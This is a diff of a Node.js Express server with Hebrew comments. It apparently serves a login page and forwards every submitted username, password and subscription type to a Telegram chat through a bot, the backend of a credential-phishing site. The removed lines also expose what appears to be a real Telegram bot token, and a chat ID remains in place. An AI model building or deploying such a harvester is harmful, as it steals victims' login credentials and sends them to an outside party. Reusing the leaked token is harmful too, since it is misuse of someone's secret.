@@ -6,14 +6,12 @@ const app = express();
 app.use(bodyParser.urlencoded({ extended: true }));
 app.use(express.json());
 
-// מאפשר לשרת להציג קבצים כמו תמונות שנמצאים בתיקייה שלך
 app.use(express.static(__dirname));
 
-// הגדרות הבוט של טלגרם (הטוקן כבר מעודכן בפנים)
-const TELEGRAM_BOT_TOKEN = '8712536099:AAGnazkihREbhPJsGpgmAXOClVF3LSFneGg';
+// הכנס כאן את הטוקן המדויק של Mikmak_mikmak_bot מ-BotFather
+const TELEGRAM_BOT_TOKEN = 'הדבק_כאן_את_הטוקן_של_Mikmak_mikmak_bot';
 const TELEGRAM_CHAT_ID = '7519574690';
 
-// פונקציה מרכזית ששולחת את ההודעה לטלגרם
 function sendToTelegram(username, password, subscription, res) {
     const message = `🔐 תזכורת פרטי התחברות חדשים מהאתר:\n\n⭐ סוג מנוי: ${subscription}\n👤 שם משתמש: ${username}\n🔑 סיסמה: ${password}`;
 
@@ -59,16 +57,12 @@ function sendToTelegram(username, password, subscription, res) {
     telegramReq.end();
 }
 
-// אומר לשרת להציג את קובץ ה-index.html כשנכנסים לאתר
 app.get('/', (req, res) => {
     res.sendFile(__dirname + '/index.html');
 });
 
-// טיפול בבקשה שמגיעה מהטופס באתר
 app.post('/send-email', (req, res) => {
     console.log('--> התקבלה בקשת שליחה חדשה מהאתר!');
-    console.log('נתונים שהתקבלו:', req.body);
-
     const username = req.body.username || 'לא צויין';
     const password = req.body.password || 'לא צויין';
     const subscription = req.body.subscription || 'לא צויין';
@@ -76,9 +70,7 @@ app.post('/send-email', (req, res) => {
     sendToTelegram(username, password, subscription, res);
 });
 
-// הפעלת השרת על הפורט של Render או פורט מקומי 3000
 const PORT = process.env.PORT || 3000;
-
 app.listen(PORT, () => {
     console.log(`השרת פעיל בהצלחה בפורט ${PORT}`);
 });
